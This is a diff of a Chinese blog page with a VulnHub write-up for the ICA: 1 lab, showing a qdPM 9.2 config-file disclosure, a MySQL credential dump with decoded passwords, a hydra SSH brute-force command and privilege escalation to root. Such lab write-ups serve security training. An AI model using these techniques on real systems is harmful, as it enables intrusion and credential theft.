@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525211250.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525223321.png">
 <meta property="article:published_time" content="2022-05-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-25T14:37:21.094Z">
+<meta property="article:modified_time" content="2022-05-25T14:38:57.332Z">
 <meta property="article:author" content="hdfzzf">
 <meta property="article:tag" content="综合">
 <meta property="article:tag" content="vulnhub">
@@ -156,7 +156,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="nav-text">端口信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="nav-text">http服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E6%9C%8D%E5%8A%A1"><span class="nav-text">MySQL服务</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#get-shell"><span class="nav-text">get shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">1. 靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">2. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="nav-text">2.1. 端口信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="nav-text">2.2. http服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E6%9C%8D%E5%8A%A1"><span class="nav-text">2.3. MySQL服务</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#get-shell"><span class="nav-text">3. get shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">4. 权限提升</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">5. 总结</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -255,7 +255,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-05-25 00:00 / 修改时间：22:37" itemprop="dateCreated datePublished" datetime="2022-05-25T00:00:00+08:00">2022-05-25</time>
+      <time title="创建时间：2022-05-25 00:00 / 修改时间：22:38" itemprop="dateCreated datePublished" datetime="2022-05-25T00:00:00+08:00">2022-05-25</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -315,7 +315,7 @@
     <div class="post-body" itemprop="articleBody">
         <p>该靶机难度中等。</p>
 <span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
+<h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ica-1,748/">ICA: 1 ~ VulnHub</a></li>
@@ -329,11 +329,11 @@
 <ul>
 <li>中</li>
 </ul>
-<h1 id="信息收集">信息收集</h1>
-<h2 id="端口信息">端口信息</h2>
+<h1 id="信息收集">2. 信息收集</h1>
+<h2 id="端口信息">2.1. 端口信息</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525135533.png" /></p>
 <p>发现除了22和80之外，还开放了3306，也就是可能存在MySQL，还有一个33060</p>
-<h2 id="http服务">http服务</h2>
+<h2 id="http服务">2.2. http服务</h2>
 <p>进入主页面是一个登录界面</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525162056.png" /></p>
 <p>得知该网页的CMS是 qdPM 并且版本为 9.2。搜索是否存在漏洞： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit qdPM</span><br></pre></td></tr></table></figure></p>
@@ -341,17 +341,17 @@
 <p>可以直接读取密码信息。查看该漏洞的详细信息： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Date: 03/08/2021</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Exploit Author: Leon Trappett (thepcn3rd)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Vendor Homepage: https://qdpm.net/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Software Link: https://sourceforge.net/projects/qdpm/files/latest/download</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Version: 9.2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4</span></span><br><span class="line"></span><br><span class="line">The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://&lt;website&gt;/core/config/databases.yml file and download.</span><br></pre></td></tr></table></figure></p>
 <p>根据PoC，直接下载对应的文件，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">all:</span><br><span class="line">  doctrine:</span><br><span class="line">    class: sfDoctrineDatabase</span><br><span class="line">    param:</span><br><span class="line">      dsn: &#x27;mysql:dbname=qdpm;host=localhost&#x27;</span><br><span class="line">      profiler: false</span><br><span class="line">      username: qdpmadmin</span><br><span class="line">      password: &quot;&lt;?php echo urlencode(&#x27;UcVQCMQk2STVeS6J&#x27;) ; ?&gt;&quot;</span><br><span class="line">      attributes:</span><br><span class="line">        quote_identifier: true  </span><br></pre></td></tr></table></figure></p>
 <p>得到数据库相关信息。</p>
-<h2 id="mysql服务">MySQL服务</h2>
+<h2 id="mysql服务">2.3. MySQL服务</h2>
 <p>利用下面命令，然后输入密码，远程连接数据库： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 10.0.2.56 -u qdpmadmin -p</span><br></pre></td></tr></table></figure></p>
 <p>在 staff 的 login表下面找到如下信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+------+---------+--------------------------+</span><br><span class="line">| id   | user_id | password                 |</span><br><span class="line">+------+---------+--------------------------+</span><br><span class="line">|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |</span><br><span class="line">|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |</span><br><span class="line">|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |</span><br><span class="line">|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |</span><br><span class="line">|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |</span><br><span class="line">+------+---------+--------------------------+</span><br></pre></td></tr></table></figure></p>
 <p>将密码base64解码后得到： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c3VSSkFkR3dMcDhkeTNyRg== -&gt; suRJAdGwLp8dy3rF</span><br><span class="line">N1p3VjRxdGc0MmNtVVhHWA== -&gt; 7ZwV4qtg42cmUXGX</span><br><span class="line">WDdNUWtQM1cyOWZld0hkQw== -&gt; X7MQkP3W29fewHdC</span><br><span class="line">REpjZVZ5OThXMjhZN3dMZw== -&gt; DJceVy98W28Y7wLg</span><br><span class="line">Y3FObkJXQ0J5UzJEdUpTeQ== -&gt; cqNnBWCByS2DuJSy</span><br></pre></td></tr></table></figure></p>
 <p>并在user表中得到对应的用户： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+------+---------------+--------+---------------------------+</span><br><span class="line">| id   | department_id | name   | role                      |</span><br><span class="line">+------+---------------+--------+---------------------------+</span><br><span class="line">|    1 |             1 | Smith  | Cyber Security Specialist |</span><br><span class="line">|    2 |             2 | Lucas  | Computer Engineer         |</span><br><span class="line">|    3 |             1 | Travis | Intelligence Specialist   |</span><br><span class="line">|    4 |             1 | Dexter | Cyber Security Analyst    |</span><br><span class="line">|    5 |             2 | Meyer  | Genetic Engineer          |</span><br><span class="line">+------+---------------+--------+---------------------------+</span><br></pre></td></tr></table></figure></p>
 <p>接着，在 qdpm数据库中的 configuration 表中得到以下重要信息，和一些其他配置信息 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| id | key                                  | value    </span><br><span class="line">|----|--------------------------------------|------------------------------------</span><br><span class="line">|  1 | app_administrator_email              | admin@localhost.com                                                                                                     </span><br><span class="line">|  2 | app_administrator_password           | $P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0 </span><br></pre></td></tr></table></figure></p>
-<h1 id="get-shell">get shell</h1>
+<h1 id="get-shell">3. get shell</h1>
 <p>将得到的用户名（注意要小写）和密码保存，然后爆破 ssh，得到两个结果： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L use.txt -P pas.txt 10.0.2.56 ssh</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525205944.png" /></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">travis:DJceVy98W28Y7wLg</span><br><span class="line">dexter:7ZwV4qtg42cmUXGX</span><br></pre></td></tr></table></figure>
-<h1 id="权限提升">权限提升</h1>
+<h1 id="权限提升">4. 权限提升</h1>
 <p>首先查看 dexter 用户的家目录下，找到一个文件 note.txt，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">It seems to me that there is a weakness while accessing the system.</span><br><span class="line">As far as I know, the contents of executable files are partially viewable.</span><br><span class="line">I need to find out if there is a vulnerability or not.</span><br></pre></td></tr></table></figure></p>
 <p>大致意思是：有一个可执行文件，该文件的部分内容是可见的，我需要找到它，确定是否存在漏洞。</p>
 <p>在 travis 用户的家目录下查看 .bash_history，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure></p>
@@ -372,7 +372,7 @@
 </ol>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525223321.png" /></p>
 <p>最后的最后，读取2个flag（<strong>此时不能使用cat了</strong>） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. /home/travis/user.txt</span><br><span class="line">ICA&#123;Secret_Project&#125;</span><br><span class="line"></span><br><span class="line">2. /root/root.txt</span><br><span class="line">ICA&#123;Next_Generation_Self_Renewable_Genetics&#125;</span><br></pre></td></tr></table></figure></p>
-<h1 id="总结">总结</h1>
+<h1 id="总结">5. 总结</h1>
 <p>该靶机难度不高，涉及的攻击方法有：</p>
 <ol type="1">
 <li>CMS漏洞</li>
@@ -399,11 +399,14 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/05/25/Hackable%E2%85%A2%20Writeup/" rel="prev" title="HackableⅢ Writeup">
-                  <i class="fa fa-chevron-left"></i> HackableⅢ Writeup
+                <a href="/2022/05/24/Hackable%E2%85%A1%20Writeup/" rel="prev" title="HackableⅡ Writeup">
+                  <i class="fa fa-chevron-left"></i> HackableⅡ Writeup
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2022/05/25/Hackable%E2%85%A2%20Writeup/" rel="next" title="HackableⅢ Writeup">
+                  HackableⅢ Writeup <i class="fa fa-chevron-right"></i>
+                </a>
             </div>
           </div>
     </footer>
